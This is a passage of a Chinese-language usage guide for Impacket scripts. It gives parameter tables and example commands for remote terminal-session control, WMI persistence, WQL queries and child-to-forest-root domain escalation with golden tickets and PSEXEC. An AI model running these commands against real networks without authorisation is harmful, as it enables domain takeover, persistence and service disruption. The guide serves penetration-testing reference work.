| `<dst ip>` | 目标 IPv6 地址 |

**示例**:

```python
python ping6.py 2001:0db8:85a3:0000:0000:8a2e:0370:7334 2001:0db8:85a3:0000:0000:8a2e:0370:7335
```

## 辅助工具

### split.py

**功能**: 文件分割工具
**用途**: 将大文件分割成多个小文件
**示例**:

```python
python split.py file.txt 1000000
```

### tstool.py

**功能**: 终端服务工具
**用途**: 终端服务操作工具

**参数说明**:

**位置参数**:

| 参数       | 说明                                                                      |
| ---------- | ------------------------------------------------------------------------- |
| `target`   | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |
| `qwinsta`  | 显示远程桌面服务会话信息                                                  |
| `tasklist` | 显示系统上当前运行的进程列表                                              |
| `taskkill` | 通过进程 ID (PID) 或图像名称终止任务                                      |
| `tscon`    | 将用户会话附加到远程桌面会话                                              |
| `tsdiscon` | 断开远程桌面服务会话                                                      |
| `logoff`   | 注销远程桌面服务会话                                                      |
| `shutdown` | 远程关机（影响所有会话和登录用户）                                        |
| `msg`      | 向远程桌面服务会话发送消息（MSGBOX）                                      |

**选项参数**:

| 参数     | 说明                     |
| -------- | ------------------------ |
| `-debug` | 开启调试输出             |
| `-ts`    | 为每个日志输出添加时间戳 |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |

**连接参数**:

| 参数                       | 说明                        |
| -------------------------- | --------------------------- |
| `-dc-ip ip address`        | 域控制器的 IP 地址          |
| `-target-ip ip address`    | 目标机器的 IP 地址          |
| `-port [destination port]` | 连接到 SMB 服务器的目标端口 |

**示例**:

```python
python tstool.py domain/username:password@target_ip qwinsta
python tstool.py domain/username:password@target_ip tasklist
python tstool.py domain/username:password@target_ip taskkill -pid 1234
python tstool.py domain/username:password@target_ip shutdown
```

### wmipersist.py

**功能**: WMI 持久化工具
**用途**: 创建/删除 WMI 事件使用者/过滤器，并在两者之间建立链接，基于指定的 WQL 过滤器或计时器执行 Visual Basic

**参数说明**:

**位置参数**:

| 参数     | 说明                                                     |
| -------- | -------------------------------------------------------- |
| `target` | 目标系统，格式为 `[domain/]username[:password]@]<address |
| install  | `install`: 安装 wmi 事件使用者/过滤器                    |
| remove   | `remove`: 删除 wmi 事件使用者/过滤器                     |

**选项参数**:

| 参数                                       | 说明                                          |
| ------------------------------------------ | --------------------------------------------- |
| `-debug`                                   | 开启调试输出                                  |
| `-ts`                                      | 为每个日志输出添加时间戳                      |
| `-com-version MAJOR_VERSION:MINOR_VERSION` | DCOM 版本，格式为 MAJOR_VERSION:MINOR_VERSION |

**认证参数**:

| 参数                    | 说明                                               |
| ----------------------- | -------------------------------------------------- |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                  |
| `-no-pass`              | 不询问密码（对 -k 有用）                           |
| `-k`                    | 使用 Kerberos 身份验证                             |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位） |
| `-dc-ip ip address`     | 域控制器的 IP 地址                                 |

**示例**:

```python
python wmipersist.py domain/username:password@target_ip install
python wmipersist.py domain/username:password@target_ip remove
python wmipersist.py -com-version 5.7 domain/username:password@target_ip install
```

### wmiquery.py

**功能**: WMI 查询工具
**用途**: 使用 Windows 管理工具执行 WQL 查询并获取对象描述

**参数说明**:

**位置参数**:

| 参数     | 说明                                                                      |
| -------- | ------------------------------------------------------------------------- |
| `target` | 目标系统，格式为 `[[domain/]username[:password]@]<targetName or address>` |

**选项参数**:

| 参数                                       | 说明                                                    |
| ------------------------------------------ | ------------------------------------------------------- |
| `-namespace NAMESPACE`                     | 命名空间名称（默认 //./root/cimv2）                     |
| `-file FILE`                               | 包含要在 WQL shell 中执行的命令的输入文件               |
| `-debug`                                   | 开启调试输出                                            |
| `-ts`                                      | 为每个日志输出添加时间戳                                |
| `-com-version MAJOR_VERSION:MINOR_VERSION` | DCOM 版本，格式为 MAJOR_VERSION:MINOR_VERSION，例如 5.7 |

**认证参数**:

| 参数                                            | 说明                                                                                   |
| ----------------------------------------------- | -------------------------------------------------------------------------------------- |
| `-hashes LMHASH:NTHASH`                         | NTLM 哈希值，格式为 LMHASH:NTHASH                                                      |
| `-no-pass`                                      | 不询问密码（对 -k 有用）                                                               |
| `-k`                                            | 使用 Kerberos 身份验证                                                                 |
| `-aesKey hex key`                               | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）                                     |
| `-dc-ip ip address`                             | 域控制器的 IP 地址                                                                     |
| `-rpc-auth-level [{integrity,privacy,default}]` | 默认、完整性（RPC_C_AUTHN_LEVEL_PKT_INTEGRITY）或隐私（RPC_C_AUTHN_LEVEL_PKT_PRIVACY） |

**示例**:

```python
python wmiquery.py domain/username:password@target_ip
python wmiquery.py -namespace //./root/cimv2 domain/username:password@target_ip
python wmiquery.py -file queries.wql domain/username:password@target_ip
```

### raiseChild.py

**功能**: 子域提权工具
**用途**: 从子域提权到森林根域

**参数说明**:

**位置参数**:

| 参数     | 说明                       |
| -------- | -------------------------- |
| `target` | domain/username[:password] |

**选项参数**:

| 参数                          | 说明                                                 |
| ----------------------------- | ---------------------------------------------------- |
| `-ts`                         | 为每个日志输出添加时间戳                             |
| `-debug`                      | 开启调试输出                                         |
| `-w pathname`                 | 将黄金票据以 CCache 格式写入指定文件                 |
| `-target-exec target address` | 主攻击完成后要执行 PSEXEC 的目标主机                 |
| `-targetRID RID`              | 要转储凭据的目标用户 RID，默认为 Administrator (500) |

**认证参数**:

| 参数                    | 说明                                                         |
| ----------------------- | ------------------------------------------------------------ |
| `-hashes LMHASH:NTHASH` | NTLM 哈希值，格式为 LMHASH:NTHASH                            |
| `-no-pass`              | 不询问密码（对 -k 有用）                                     |
| `-k`                    | 使用 Kerberos 身份验证，从 ccache 文件（KRB5CCNAME）获取凭据 |
| `-aesKey hex key`       | 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）           |

**示例**:

```python
python raiseChild.py domain/username:password
python raiseChild.py -w golden.ccache domain/username:password
python raiseChild.py -target-exec 192.168.1.100 domain/username:password
python raiseChild.py -targetRID 1104 domain/username:password
```

## 使用注意事项

1. **权限要求**: 部分工具是需要管理员或域管的权限的
2. **网络环境**: 确保目标系统可访问，防火墙允许相关端口
3. **版本兼容性**: Impacket 0.13 版本是跟之前的一些py脚本命令是有出入的。如果你使用0.13版本就尽可能参考我这边翻译转化而来的
4. **依赖安装**: 确保已安装所有必要的依赖库，kali内置了impacket的依赖库，必要的时候最好使用venv虚拟环境，不然环境很容易混

## 常见问题排查

- **连接失败**: 检查网络连通性、防火墙设置、凭据是否正确

- **权限不足**: 确认使用的账户具有足够权限
